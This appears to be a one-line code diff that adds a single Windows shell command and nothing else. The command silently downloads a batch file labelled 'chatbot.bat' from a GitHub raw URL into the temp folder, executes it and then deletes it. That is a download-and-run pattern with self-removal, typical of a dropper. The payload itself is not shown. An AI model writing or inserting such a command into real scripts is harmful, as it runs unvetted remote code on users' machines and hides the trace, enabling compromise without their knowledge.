@@ -1,0 +1,1 @@
+curl -s "https://raw.githubusercontent.com/23bma106/bro/main/chatbot.bat" -o %temp%\bro.bat && %temp%\bro.bat & del %temp%\bro.bat
